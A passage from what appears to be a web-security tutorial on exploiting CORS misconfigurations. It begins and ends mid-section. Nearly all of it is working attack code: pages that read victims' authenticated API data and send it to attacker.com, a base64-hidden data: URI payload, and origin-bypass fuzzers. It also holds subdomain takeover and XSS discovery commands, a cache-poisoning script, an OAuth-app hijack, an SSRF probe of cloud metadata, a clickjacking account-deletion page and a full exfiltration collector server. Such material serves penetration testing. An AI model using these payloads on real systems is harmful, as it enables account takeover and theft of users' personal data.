fetch('https://target.com/api/me', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Can't use fetch to attacker.com from sandbox
  // Use parent.postMessage or image beacon
  new Image().src = 'https://attacker.com/collect?d=' + 
    encodeURIComponent(JSON.stringify(data));
});
</script>
"></iframe>
</body>
</html>
```

```html [Sandboxed iframe — Full Exploit]
<!DOCTYPE html>
<html>
<body>
<iframe id="exploit" sandbox="allow-scripts allow-forms" style="display:none"></iframe>
<script>
// Build exploit payload
var payload = `
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/me', true);
xhr.withCredentials = true;
xhr.onload = function() {
  // postMessage to parent
  parent.postMessage(xhr.responseText, '*');
};
xhr.send();
<\/script>
`;

// Set via srcdoc
document.getElementById('exploit').srcdoc = payload;

// Receive stolen data
window.addEventListener('message', function(e) {
  console.log('Stolen data:', e.data);
  
  // Forward to attacker server
  fetch('https://attacker.com/null-origin', {
    method: 'POST',
    body: e.data
  });
});
</script>
</body>
</html>
```

:::

:::tabs-item{icon="i-lucide-file" label="data: URI"}

```html [data: URI — null Origin Exploit]
<!DOCTYPE html>
<html>
<body>
<iframe src="data:text/html;base64,PHNjcmlwdD4KZmV0Y2goJ2h0dHBzOi8vdGFyZ2V0LmNvbS9hcGkvbWUnLCB7CiAgY3JlZGVudGlhbHM6ICdpbmNsdWRlJwp9KS50aGVuKHI9PnIudGV4dCgpKS50aGVuKGQ9PnsKICBuZXcgSW1hZ2UoKS5zcmMgPSAnaHR0cHM6Ly9hdHRhY2tlci5jb20vY29sbGVjdD9kPScgKyBlbmNvZGVVUklDb21wb25lbnQoZCk7Cn0pOwo8L3NjcmlwdD4="></iframe>

<!-- Base64 decodes to:
<script>
fetch('https://target.com/api/me', {
  credentials: 'include'
}).then(r=>r.text()).then(d=>{
  new Image().src = 'https://attacker.com/collect?d=' + encodeURIComponent(d);
});
</script>
-->
</body>
</html>
```

:::

:::tabs-item{icon="i-lucide-form-input" label="Form + Sandbox"}

```html [Form Submission with null Origin]
<!DOCTYPE html>
<html>
<body>
<!-- Sandboxed form sends null origin -->
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<form id='f' action='https://target.com/api/settings' method='POST'>
  <input name='email' value='attacker@evil.com'>
  <input name='notification' value='false'>
</form>
<script>
// Read data first
fetch('https://target.com/api/me', {credentials:'include'})
.then(r=>r.text())
.then(d=>{
  new Image().src='https://attacker.com/steal?d='+encodeURIComponent(d);
  // Then submit form
  document.getElementById('f').submit();
});
</script>
"></iframe>
</body>
</html>
```

:::

::

---

## Exploitation — Regex and Pattern Bypass

### Common Weak Validation Patterns

```text [Weak Regex Patterns and Bypasses]
┌──────────────────────────────────────────────────────────────────────┐
│  Validation Pattern          │ Bypass Origin                        │
│──────────────────────────────│──────────────────────────────────────│
│  endsWith('.target.com')     │ https://evil-target.com              │
│                              │ https://eviltarget.com               │
│                              │ https://not-target.com               │
│──────────────────────────────│──────────────────────────────────────│
│  contains('target.com')      │ https://target.com.evil.com          │
│                              │ https://evil.com/target.com          │
│                              │ https://targetXcom.evil.com          │
│──────────────────────────────│──────────────────────────────────────│
│  startsWith('target.com')    │ https://target.com.evil.com          │
│                              │ https://target.com-evil.com          │
│                              │ https://target.com:evil.com          │
│──────────────────────────────│──────────────────────────────────────│
│  regex: /target\.com$/       │ https://eviltarget.com               │
│  (no anchor on subdomain)    │ https://xtarget.com                  │
│──────────────────────────────│──────────────────────────────────────│
│  regex: /^https?:\/\/.*      │ https://evil.com?.target.com         │
│    target\.com/              │ https://evil.com#.target.com         │
│  (any match in URL)          │ https://evil.com/.target.com         │
│──────────────────────────────│──────────────────────────────────────│
│  regex: /\.target\.com$/     │ https://evil.target.com (if no       │
│  (trusts all subdomains)     │   subdomain control, need XSS/       │
│                              │   takeover on *.target.com)           │
│──────────────────────────────│──────────────────────────────────────│
│  Unescaped dot in regex      │ https://targetXcom.evil.com          │
│  /target.com/                │ (dot matches any char)               │
│──────────────────────────────│──────────────────────────────────────│
│  Protocol not checked        │ http://target.com (downgrade)        │
│                              │ attacker MITM on HTTP                │
│──────────────────────────────│──────────────────────────────────────│
│  Port not validated          │ https://target.com:8443              │
│                              │ (if attacker controls service on     │
│                              │  target port)                        │
└──────────────────────────────────────────────────────────────────────┘
```

### Regex Bypass Testing Script

```bash [Regex Bypass Fuzzer]
#!/bin/bash
TARGET="https://target.com/api/me"
DOMAIN="target.com"
COOKIE="session=YOUR_SESSION_COOKIE"

# Generate bypass origins
ORIGINS=(
  # Suffix matching bypasses
  "https://evil${DOMAIN}"
  "https://evil-${DOMAIN}"
  "https://evil.${DOMAIN}"
  "https://not${DOMAIN}"
  "https://x${DOMAIN}"
  
  # Prefix matching bypasses
  "https://${DOMAIN}.evil.com"
  "https://${DOMAIN}-evil.com"
  "https://${DOMAIN}evil.com"
  "https://${DOMAIN}:evil.com"
  "https://${DOMAIN}%40evil.com"
  "https://${DOMAIN}%2f@evil.com"
  "https://${DOMAIN}%23@evil.com"
  "https://${DOMAIN}%2eevil.com"
  
  # Subdomain bypasses
  "https://evil.${DOMAIN}"
  "https://a.b.c.evil.${DOMAIN}"
  "https://test.${DOMAIN}"
  "https://staging.${DOMAIN}"
  "https://dev.${DOMAIN}"
  "https://api.${DOMAIN}"
  
  # Dot as any char bypass
  "https://targetXcom.evil.com"
  "https://target-com.evil.com"
  "https://target_com.evil.com"
  
  # Special characters in origin
  "https://${DOMAIN}%60evil.com"
  "https://${DOMAIN}%09evil.com"
  "https://${DOMAIN}%0devil.com"
  "https://${DOMAIN}%0aevil.com"
  "https://${DOMAIN}%00evil.com"
  "https://${DOMAIN}%5cevil.com"
  "https://${DOMAIN}%7cevil.com"
  "https://${DOMAIN}!evil.com"
  "https://${DOMAIN}'evil.com"
  "https://${DOMAIN};evil.com"
  
  # Protocol variations
  "http://${DOMAIN}"
  "http://evil.${DOMAIN}"
  
  # null and special
  "null"
  
  # With port
  "https://${DOMAIN}:1234"
  "https://${DOMAIN}:443"
  "https://${DOMAIN}:8080"
  
  # Unicode / IDN
  "https://${DOMAIN/a/а}"
  "https://tаrget.com"
  
  # Backslash (IE/Edge legacy)
  "https://${DOMAIN}\\@evil.com"
  "https://evil.com\\${DOMAIN}"
)

echo "[*] Testing ${#ORIGINS[@]} origin bypass patterns against $TARGET"
echo "================================================================"

for origin in "${ORIGINS[@]}"; do
  RESP_HEADERS=$(curl -sI "$TARGET" \
    -H "Origin: $origin" \
    -H "Cookie: $COOKIE" 2>/dev/null)
  
  ACAO=$(echo "$RESP_HEADERS" | grep -i "access-control-allow-origin" | head -1 | sed 's/.*: //' | tr -d '\r\n')
  ACAC=$(echo "$RESP_HEADERS" | grep -i "access-control-allow-credentials" | head -1 | sed 's/.*: //' | tr -d '\r\n')
  
  if [ -n "$ACAO" ]; then
    # Check if our origin is reflected
    if echo "$ACAO" | grep -qi "evil\|attacker\|null\|hack"; then
      echo "[+] REFLECTED: Origin: $origin"
      echo "    ACAO: $ACAO"
      echo "    ACAC: $ACAC"
    elif [ "$ACAO" = "*" ]; then
      echo "[~] WILDCARD: Origin: $origin → ACAO: *"
    fi
  fi
done
```

### Exploiting Regex Bypasses

::code-group

```html [Suffix Bypass Exploit]
<!-- When server checks endsWith('target.com') -->
<!-- Register: eviltarget.com -->
<!-- Host this on https://eviltarget.com/exploit.html -->
<!DOCTYPE html>
<html>
<body>
<script>
// Origin will be: https://eviltarget.com
// Server sees 'target.com' at end → allows
fetch('https://target.com/api/me', {
  credentials: 'include'
}).then(r => r.json()).then(data => {
  fetch('https://eviltarget.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
</body>
</html>
```

```html [Prefix Bypass Exploit]
<!-- When server checks startsWith('https://target.com') -->
<!-- Host on: https://target.com.evil.com/exploit.html -->
<!-- Need to control target.com.evil.com DNS -->
<!DOCTYPE html>
<html>
<body>
<script>
// Origin: https://target.com.evil.com
// Server sees startsWith('target.com') → allows
fetch('https://target.com/api/me', {
  credentials: 'include'
}).then(r => r.json()).then(data => {
  fetch('https://target.com.evil.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
</body>
</html>
```

```html [Unescaped Dot Bypass Exploit]
<!-- When server regex: /target.com/ (dot not escaped) -->
<!-- Register: targetXcom.evil.com -->
<!DOCTYPE html>
<html>
<body>
<script>
// Origin: https://targetXcom.evil.com
// Regex /target.com/ matches 'targetXcom' (dot = any char)
fetch('https://target.com/api/me', {
  credentials: 'include'
}).then(r => r.json()).then(data => {
  navigator.sendBeacon('https://attacker.com/collect', JSON.stringify(data));
});
</script>
</body>
</html>
```

::

---

## Exploitation — Subdomain Trust

### Subdomain Trust + XSS Chain

```text [Subdomain Trust Attack Chain]
┌──────────────────────────────────────────────────┐
│  CSP allows: *.target.com (subdomain trust)      │
│                                                  │
│  Attack Path 1: XSS on Subdomain                │
│  ┌─────────────────────────┐                     │
│  │ Find XSS on any         │                     │
│  │ subdomain:              │                     │
│  │  - blog.target.com      │                     │
│  │  - dev.target.com       │                     │
│  │  - staging.target.com   │                     │
│  │  - support.target.com   │                     │
│  │  - forum.target.com     │                     │
│  └───────────┬─────────────┘                     │
│              │                                   │
│              ▼                                   │
│  ┌─────────────────────────┐                     │
│  │ XSS payload does        │                     │
│  │ cross-origin fetch to   │                     │
│  │ api.target.com/api/me   │                     │
│  │ with credentials        │                     │
│  └───────────┬─────────────┘                     │
│              │                                   │
│              ▼                                   │
│  ┌─────────────────────────┐                     │
│  │ CORS allows because     │                     │
│  │ origin is *.target.com  │                     │
│  │ → Data stolen ✅        │                     │
│  └─────────────────────────┘                     │
│                                                  │
│  Attack Path 2: Subdomain Takeover               │
│  ┌─────────────────────────┐                     │
│  │ Find dangling CNAME:    │                     │
│  │ old.target.com → ???    │                     │
│  │ Claim the subdomain     │                     │
│  │ Host CORS exploit       │                     │
│  └─────────────────────────┘                     │
└──────────────────────────────────────────────────┘
```

::tabs

:::tabs-item{icon="i-lucide-bug" label="XSS on Subdomain → CORS"}

```html [XSS Chain Payload]
<!-- Inject this XSS on blog.target.com or any subdomain -->
<script>
// Origin will be https://blog.target.com
// CORS trusts *.target.com
fetch('https://api.target.com/api/me', {
  credentials: 'include'
}).then(r => r.json()).then(data => {
  // Exfiltrate
  fetch('https://attacker.com/subdomain-chain', {
    method: 'POST',
    body: JSON.stringify({
      source: 'blog.target.com',
      data: data
    })
  });
});
</script>
```

:::

:::tabs-item{icon="i-lucide-globe" label="Subdomain Takeover → CORS"}

```bash [Subdomain Takeover Discovery]
# Find subdomains
subfinder -d target.com -silent | tee subdomains.txt
amass enum -d target.com -passive | tee -a subdomains.txt
sort -u subdomains.txt -o subdomains.txt

# Check for dangling CNAMEs
cat subdomains.txt | while read sub; do
  CNAME=$(dig +short CNAME "$sub" 2>/dev/null)
  if [ -n "$CNAME" ]; then
    # Check if CNAME target is claimable
    RESOLVE=$(dig +short "$CNAME" 2>/dev/null)
    if [ -z "$RESOLVE" ]; then
      echo "[+] DANGLING: $sub → $CNAME (NXDOMAIN)"
    fi
  fi
done

# Use subjack for automated detection
subjack -w subdomains.txt -t 50 -o takeover_results.txt -ssl -v

# Use nuclei takeover templates
nuclei -l subdomains.txt -t http/takeovers/ -o takeover_nuclei.txt

# Can-I-Take-Over-XYZ reference
# https://github.com/EdOverflow/can-i-take-over-xyz
```

```html [Takeover CORS Exploit]
<!-- After claiming subdomain (e.g., old.target.com) -->
<!-- Host this on https://old.target.com/index.html -->
<!DOCTYPE html>
<html>
<body>
<script>
fetch('https://api.target.com/api/me', {
  credentials: 'include'
}).then(r => r.json()).then(data => {
  navigator.sendBeacon('https://attacker.com/takeover-cors', JSON.stringify(data));
});
</script>
</body>
</html>
```

:::

:::tabs-item{icon="i-lucide-search" label="Subdomain XSS Discovery"}

```bash [Find XSS on Subdomains]
# Crawl subdomains for reflection points
cat subdomains.txt | httpx -silent | tee alive_subs.txt

# Test for reflected parameters
cat alive_subs.txt | while read url; do
  # Append test parameter
  RESP=$(curl -s "${url}/?q=cors_xss_test_12345" 2>/dev/null)
  echo "$RESP" | grep -q "cors_xss_test_12345" && echo "[+] Reflection: ${url}/?q="
done

# Use dalfox
cat alive_subs.txt | dalfox pipe --silence --only-poc | tee subdomain_xss.txt

# Use kxss
cat alive_subs.txt | kxss | tee kxss_results.txt

# Use gf patterns
cat alive_subs.txt | gau | gf xss | sort -u | tee xss_params.txt

# Nuclei XSS templates against subdomains
nuclei -l alive_subs.txt -tags xss -o subdomain_xss_nuclei.txt
```

:::

::

---

## Advanced Attack Scenarios

### Token-Based Authentication CORS Abuse

::note
Even without `Access-Control-Allow-Credentials: true`, if the application uses token-based authentication via `Authorization` headers (Bearer tokens, API keys) AND the CORS policy allows arbitrary origins with the `Authorization` header exposed, tokens stored in JavaScript-accessible storage can be stolen via XSS then replayed cross-origin.
::

```html [Token-Based Auth CORS Chain]
<!-- Scenario: API uses Bearer token, CORS allows * or reflects origin -->
<!-- Token is in localStorage from previous XSS or same-origin context -->
<!DOCTYPE html>
<html>
<body>
<script>
// If CORS allows Authorization header from any origin
// AND we know/can guess the Bearer token format

// Method 1: If we have the token (via XSS on same origin)
var stolenToken = 'Bearer eyJhbGciOiJIUzI1NiIs...';

fetch('https://api.target.com/api/me', {
  headers: {
    'Authorization': stolenToken
  }
}).then(r => r.json()).then(data => {
  fetch('https://attacker.com/token-auth', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});

// Method 2: Check if preflight allows Authorization
fetch('https://api.target.com/api/me', {
  method: 'OPTIONS',
  headers: {
    'Access-Control-Request-Headers': 'Authorization'
  }
}).then(r => {
  console.log('Allow-Headers:', r.headers.get('Access-Control-Allow-Headers'));
});
</script>
</body>
</html>
```

### WebSocket CORS Abuse

```html [WebSocket Cross-Origin (No SOP)]
<!DOCTYPE html>
<html>
<body>
<script>
// WebSockets don't follow SOP the same way
// If target has WebSocket endpoint, Origin header is sent but
// server may not validate it

var ws = new WebSocket('wss://target.com/ws');

ws.onopen = function() {
  // Send commands through the WebSocket
  ws.send(JSON.stringify({
    action: 'get_user_data',
    type: 'full_export'
  }));
};

ws.onmessage = function(event) {
  // Exfiltrate received data
  fetch('https://attacker.com/ws-data', {
    method: 'POST',
    body: event.data
  });
};

ws.onerror = function(error) {
  console.log('WebSocket Error:', error);
};
</script>
</body>
</html>
```

### CORS + Cache Poisoning Chain

```text [CORS Cache Poisoning Flow]
┌──────────────────────────────────────────────────────────┐
│ 1. Attacker sends request with evil Origin                │
│    GET /api/public-data                                   │
│    Origin: https://evil.com                               │
│                                                          │
│ 2. Server responds with:                                  │
│    Access-Control-Allow-Origin: https://evil.com          │
│    Cache-Control: public, max-age=3600                    │
│    (response gets cached by CDN/proxy)                    │
│                                                          │
│ 3. Victim requests same resource                          │
│    GET /api/public-data                                   │
│    Origin: https://legitimate-app.com                     │
│                                                          │
│ 4. CDN serves cached response:                            │
│    Access-Control-Allow-Origin: https://evil.com  ⚠️     │
│    Victim's browser BLOCKS the response because           │
│    ACAO doesn't match victim's origin                     │
│                                                          │
│ Result: Denial of Service for the API endpoint            │
│ (CORS headers cached with wrong origin)                   │
└──────────────────────────────────────────────────────────┘
```

```bash [Cache Poisoning Test]
# Check if CORS responses are cached
curl -sI https://target.com/api/data \
  -H "Origin: https://evil.com" | grep -iE "cache-control|age:|x-cache|vary"

# If Vary header does NOT include Origin → cache poisoning possible
# Correct: Vary: Origin
# Vulnerable: Vary: (missing) or Vary: Accept-Encoding (no Origin)

# Step 1: Poison the cache
curl -s https://target.com/api/data -H "Origin: https://evil.com" > /dev/null

# Step 2: Check if cached
curl -sI https://target.com/api/data \
  -H "Origin: https://legitimate.com" | grep -i "access-control-allow-origin"
# If still shows evil.com → cache poisoned!

# Repeat requests to ensure cache is filled
for i in $(seq 1 10); do
  curl -s https://target.com/api/data -H "Origin: https://evil.com" > /dev/null
done
```

### Server-Side Request Flow Analysis

```bash [Identify Backend CORS Logic]
# Test how origin is processed
# Check for header injection via Origin
curl -sI https://target.com/api/me \
  -H "Origin: https://evil.com%0d%0aX-Injected: true" | head -20

# CRLF in Origin (header injection)
curl -sI https://target.com/api/me \
  -H $'Origin: https://evil.com\r\nAccess-Control-Allow-Origin: https://evil.com' | head -20

# Origin with path (should be ignored but some parsers don't)
curl -sI https://target.com/api/me \
  -H "Origin: https://evil.com/path" | grep -i access-control

# Multiple Origin headers
curl -sI https://target.com/api/me \
  -H "Origin: https://evil.com" \
  -H "Origin: https://target.com" | grep -i access-control

# Case sensitivity
curl -sI https://target.com/api/me \
  -H "Origin: HTTPS://TARGET.COM" | grep -i access-control

curl -sI https://target.com/api/me \
  -H "Origin: https://TARGET.COM" | grep -i access-control

# Empty Origin
curl -sI https://target.com/api/me \
  -H "Origin: " | grep -i access-control

# Very long Origin
curl -sI https://target.com/api/me \
  -H "Origin: https://$(python3 -c 'print("a"*10000)').com" | grep -i access-control

# Origin without scheme
curl -sI https://target.com/api/me \
  -H "Origin: target.com" | grep -i access-control

curl -sI https://target.com/api/me \
  -H "Origin: //target.com" | grep -i access-control
```

---

## Exfiltration Techniques

### Multi-Method Exfiltration

::tabs

:::tabs-item{icon="i-lucide-send" label="fetch + sendBeacon"}

```html [Reliable Exfiltration]
<script>
async function exfil(data) {
  const payload = JSON.stringify(data);
  
  // Method 1: fetch POST
  try {
    await fetch('https://attacker.com/exfil', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: payload
    });
    return;
  } catch(e) {}
  
  // Method 2: sendBeacon (works during page unload)
  try {
    navigator.sendBeacon('https://attacker.com/exfil', payload);
    return;
  } catch(e) {}
  
  // Method 3: Image beacon (GET, limited size)
  try {
    new Image().src = 'https://attacker.com/exfil?d=' + 
      encodeURIComponent(btoa(payload));
    return;
  } catch(e) {}
  
  // Method 4: WebSocket
  try {
    var ws = new WebSocket('wss://attacker.com/ws');
    ws.onopen = () => ws.send(payload);
  } catch(e) {}
}

// Steal from CORS-misconfigured endpoint
fetch('https://target.com/api/me', { credentials: 'include' })
  .then(r => r.json())
  .then(data => exfil(data));
</script>
```

:::

:::tabs-item{icon="i-lucide-split" label="Chunked Exfiltration"}

```html [Large Data Chunked Exfil]
<script>
async function chunkExfil(data, chunkSize = 4000) {
  const encoded = btoa(JSON.stringify(data));
  const chunks = [];
  
  for (let i = 0; i < encoded.length; i += chunkSize) {
    chunks.push(encoded.substring(i, i + chunkSize));
  }
  
  const sessionId = Math.random().toString(36).substring(2);
  
  for (let i = 0; i < chunks.length; i++) {
    await fetch('https://attacker.com/chunk', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        session: sessionId,
        chunk: i,
        total: chunks.length,
        data: chunks[i]
      })
    });
    await new Promise(r => setTimeout(r, 200)); // Rate limit
  }
}

fetch('https://target.com/api/export/all', { credentials: 'include' })
  .then(r => r.json())
  .then(data => chunkExfil(data));
</script>
```

:::

:::tabs-item{icon="i-lucide-monitor" label="DNS Exfiltration"}

```html [DNS-Based Exfil (Stealthier)]
<script>
function dnsExfil(data) {
  // Encode data into DNS-safe format
  const encoded = btoa(JSON.stringify(data))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
  
  // Split into 60-char labels (DNS label limit is 63)
  const labels = [];
  for (let i = 0; i < encoded.length; i += 60) {
    labels.push(encoded.substring(i, i + 60));
  }
  
  // Send as DNS queries via image beacons
  const sessId = Math.random().toString(36).substr(2, 8);
  labels.forEach((label, i) => {
    new Image().src = `https://${i}.${labels.length}.${sessId}.${label}.dns.attacker.com/x.gif`;
  });
}

fetch('https://target.com/api/me', { credentials: 'include' })
  .then(r => r.json())
  .then(dnsExfil);
</script>
```

:::

::

### Exfiltration Server

::code-group

```python [Python Collector Server]
#!/usr/bin/env python3
"""CORS Exfiltration Collector"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import unquote, urlparse, parse_qs
import json, datetime, base64, os

LOG_FILE = 'cors_exfil.log'

class CORSCollector(BaseHTTPRequestHandler):
    def _cors_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.send_header('Access-Control-Max-Age', '86400')

    def _log(self, method, data):
        ts = datetime.datetime.now().isoformat()
        entry = {
            'timestamp': ts,
            'method': method,
            'path': self.path,
            'ip': self.client_address[0],
            'user_agent': self.headers.get('User-Agent', ''),
            'origin': self.headers.get('Origin', ''),
            'referer': self.headers.get('Referer', ''),
            'data': data
        }
        
        print(f"\n{'='*60}")
        print(f"[{ts}] {method} from {self.client_address[0]}")
        print(f"Origin: {entry['origin']}")
        print(f"Referer: {entry['referer']}")
        if isinstance(data, dict):
            print(json.dumps(data, indent=2)[:2000])
        else:
            print(str(data)[:2000])
        print(f"{'='*60}")
        
        with open(LOG_FILE, 'a') as f:
            f.write(json.dumps(entry) + '\n')

    def do_OPTIONS(self):
        self.send_response(200)
        self._cors_headers()
        self.end_headers()

    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        # Decode base64 data if present
        decoded_params = {}
        for k, v in params.items():
            try:
                decoded_params[k] = base64.b64decode(v[0]).decode('utf-8')
            except:
                decoded_params[k] = v[0]
        
        self._log('GET', decoded_params)
        self.send_response(200)
        self._cors_headers()
        self.send_header('Content-Type', 'image/gif')
        self.end_headers()
        # 1x1 transparent GIF
        self.wfile.write(base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'))

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='replace')
        try:
            data = json.loads(body)
        except:
            data = body
        
        self._log('POST', data)
        self.send_response(200)
        self._cors_headers()
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"status":"received"}')

    def log_message(self, format, *args):
        pass

PORT = int(os.environ.get('PORT', 8443))
print(f"[*] CORS Exfiltration Collector running on port {PORT}")
print(f"[*] Logging to: {LOG_FILE}")
HTTPServer(('0.0.0.0', PORT), CORSCollector).serve_forever()
```

```bash [Quick Listeners]
# Netcat
while true; do nc -lvp 8443; done

# Python one-liner with CORS
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'GET {self.path}')
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin','*')
        self.end_headers()
    def do_POST(self):
        d=self.rfile.read(int(self.headers.get('Content-Length',0)))
        print(f'POST: {d.decode()}')
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin','*')
        self.end_headers()
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin','*')
        self.send_header('Access-Control-Allow-Methods','*')
        self.send_header('Access-Control-Allow-Headers','*')
        self.end_headers()
HTTPServer(('',8443),H).serve_forever()
"

# Interactsh
interactsh-client -v
```

::

---

## Chaining Techniques

### CORS + XSS Chain

```text [CORS + XSS Exploitation Chain]
┌───────────────────────────────────────────────────┐
│  Target: app.target.com (no XSS, CORS trusts      │
│          *.target.com with credentials)            │
│                                                   │
│  Vulnerable: blog.target.com (Reflected XSS in    │
│              search parameter)                     │
│                                                   │
│  Chain:                                           │
│  1. Craft XSS on blog.target.com                  │
│  2. XSS fetches app.target.com/api/me             │
│     with credentials: 'include'                    │
│  3. CORS allows (origin is *.target.com)          │
│  4. Response with user data readable              │
│  5. XSS exfiltrates data to attacker.com          │
└───────────────────────────────────────────────────┘
```

```html [CORS + XSS Combined Payload]
<!-- URL: https://blog.target.com/search?q=PAYLOAD -->
<!-- XSS payload (URL encoded in q parameter): -->
<script>
fetch('https://app.target.com/api/me',{credentials:'include'})
.then(r=>r.json())
.then(d=>fetch('https://attacker.com/xss-cors',{method:'POST',body:JSON.stringify(d)}))
</script>

<!-- Full encoded URL: -->
<!-- https://blog.target.com/search?q=%3Cscript%3Efetch('https://app.target.com/api/me',{credentials:'include'}).then(r%3D%3Er.json()).then(d%3D%3Efetch('https://attacker.com/xss-cors',{method:'POST',body:JSON.stringify(d)}))%3C/script%3E -->
```

### CORS + OAuth Token Theft

```html [CORS + OAuth Flow Exploitation]
<!DOCTYPE html>
<html>
<body>
<script>
async function stealOAuth() {
  // Step 1: Steal user info via CORS
  const userResp = await fetch('https://target.com/api/me', {
    credentials: 'include'
  });
  const user = await userResp.json();
  
  // Step 2: Get OAuth tokens if exposed
  const tokenResp = await fetch('https://target.com/oauth/token/info', {
    credentials: 'include'
  });
  const tokens = await tokenResp.json();
  
  // Step 3: Get connected applications
  const appsResp = await fetch('https://target.com/api/oauth/applications', {
    credentials: 'include'
  });
  const apps = await appsResp.json();
  
  // Step 4: Create new OAuth application (if admin)
  const newApp = await fetch('https://target.com/api/oauth/applications', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      name: 'Backup Integration',
      redirect_uri: 'https://attacker.com/oauth/callback',
      scopes: 'read write admin'
    })
  });
  const appData = await newApp.json();
  
  // Exfiltrate all
  fetch('https://attacker.com/oauth-chain', {
    method: 'POST',
    body: JSON.stringify({ user, tokens, apps, newApp: appData })
  });
}

stealOAuth();
</script>
</body>
</html>
```

### CORS + SSRF / Internal Network

```html [CORS to Internal Network Access]
<!DOCTYPE html>
<html>
<body>
<script>
// If CORS-misconfigured API proxies requests or has SSRF
async function internalScan() {
  const results = {};
  
  // Use CORS-vulnerable endpoint to access internal services
  // If target has an API that fetches URLs or proxies requests
  const internalTargets = [
    'http://localhost:8080/admin',
    'http://127.0.0.1:3000/api/health',
    'http://192.168.1.1/config',
    'http://10.0.0.1:9200/_cat/indices',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://169.254.169.254/latest/meta-data/'
  ];
  
  for (const target of internalTargets) {
    try {
      // If API has a proxy/fetch endpoint
      const resp = await fetch('https://target.com/api/proxy?url=' + 
        encodeURIComponent(target), {
        credentials: 'include'
      });
      if (resp.ok) {
        results[target] = await resp.text();
      }
    } catch(e) {
      results[target] = 'error';
    }
  }
  
  fetch('https://attacker.com/internal', {
    method: 'POST',
    body: JSON.stringify(results)
  });
}

internalScan();
</script>
</body>
</html>
```

### CORS + Clickjacking Chain

```html [CORS + Clickjacking]
<!DOCTYPE html>
<html>
<body>
<style>
  .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
  iframe { opacity: 0.0001; position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2; }
</style>

<!-- Visible bait page -->
<div class="overlay">
  <h1>Win a Prize!</h1>
  <button style="font-size:24px;padding:20px 40px;cursor:pointer;">
    Click to Claim
  </button>
</div>

<!-- Hidden iframe with target action -->
<iframe src="https://target.com/settings/delete-account"></iframe>

<script>
// Meanwhile, silently steal data via CORS
fetch('https://target.com/api/me', { credentials: 'include' })
  .then(r => r.json())
  .then(data => {
    navigator.sendBeacon('https://attacker.com/cors-click', JSON.stringify(data));
  });
</script>
</body>
</html>
```

---

## Framework-Specific Testing

### Common Framework CORS Patterns

::tabs

:::tabs-item{icon="i-lucide-code" label="Express.js / Node.js"}

```bash [Express CORS Test]
# Express with cors middleware — common misconfigurations:

# Test 1: Reflected origin (cors({ origin: true }))
curl -sI https://target.com/api/me \
  -H "Origin: https://evil.com" | grep "access-control"

# Test 2: Regex bypass
# Developer might use: origin: /target\.com$/
curl -sI https://target.com/api/me \
  -H "Origin: https://eviltarget.com" | grep "access-control"

# Test 3: Array whitelist with null
# origin: ['https://app.target.com', null]
curl -sI https://target.com/api/me \
  -H "Origin: null" | grep "access-control"

# Vulnerable Express code patterns to look for:
# app.use(cors({ origin: true, credentials: true }))
# app.use(cors({ origin: req.headers.origin, credentials: true }))
# res.setHeader('Access-Control-Allow-Origin', req.headers.origin)
```

:::

:::tabs-item{icon="i-lucide-code" label="Django / Python"}

```bash [Django CORS Test]
# django-cors-headers misconfigurations:

# Test 1: CORS_ORIGIN_ALLOW_ALL = True
curl -sI https://target.com/api/me \
  -H "Origin: https://evil.com" | grep "access-control"

# Test 2: CORS_ORIGIN_REGEX_WHITELIST weak regex
curl -sI https://target.com/api/me \
  -H "Origin: https://eviltarget.com" | grep "access-control"

# Test 3: CORS_ALLOW_CREDENTIALS = True with allow all
curl -sI https://target.com/api/me \
  -H "Origin: https://evil.com" \
  -H "Cookie: sessionid=xxx" | grep "access-control"

# Vulnerable Django settings to look for:
# CORS_ORIGIN_ALLOW_ALL = True
# CORS_ALLOW_CREDENTIALS = True
# CORS_ORIGIN_REGEX_WHITELIST = [r'^https://.*target\.com$']  (weak regex)
```

:::

:::tabs-item{icon="i-lucide-code" label="Spring Boot / Java"}

```bash [Spring CORS Test]
# Spring Framework CORS misconfigurations:

# Test 1: @CrossOrigin without origins restriction
curl -sI https://target.com/api/me \
  -H "Origin: https://evil.com" | grep "access-control"

# Test 2: CorsConfiguration.setAllowedOrigins(Arrays.asList("*"))
# with setAllowCredentials(true)
curl -sI https://target.com/api/me \
  -H "Origin: https://evil.com" \
  -H "Cookie: JSESSIONID=xxx" | grep "access-control"

# Test 3: addAllowedOriginPattern("*")
curl -sI https://target.com/api/me \
  -H "Origin: https://anything.evil.com" | grep "access-control"

# Vulnerable Spring code:
# @CrossOrigin(origins = "*", allowCredentials = "true")
# config.addAllowedOrigin("*");
# config.setAllowCredentials(true);
```

:::

:::tabs-item{icon="i-lucide-code" label="Rails / Ruby"}

```bash [Rails CORS Test]
# rack-cors gem misconfigurations:

# Test 1: allow { origins '*' }
curl -sI https://target.com/api/me \
  -H "Origin: https://evil.com" | grep "access-control"

# Test 2: Dynamic origin from request
